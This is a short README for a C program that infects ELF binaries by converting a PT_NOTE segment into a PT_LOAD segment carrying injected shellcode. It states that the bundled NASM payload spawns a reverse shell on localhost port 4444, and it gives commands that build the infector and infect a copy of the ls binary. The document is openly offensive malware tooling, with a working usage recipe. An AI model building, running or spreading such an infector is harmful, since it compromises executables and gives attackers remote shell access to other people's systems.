# readme

A small ELF infector written in C. This program tries to find a valid PT_NOTE segment and convert it to a PT_LOAD segment.

The shellcode in the array for the patching function is derived from the assembly in jumpstart.s. The included payload is written in NASM and generates shellcode to spawn a reverse shell on localhost, port 4444.

```
$ gcc -o elf_infector elf_infector.c
$ cp $(which ls) ls
$ nasm -o shellcode shellcode.s
$ ./elf_infector ./ls shellcode
```

UwU

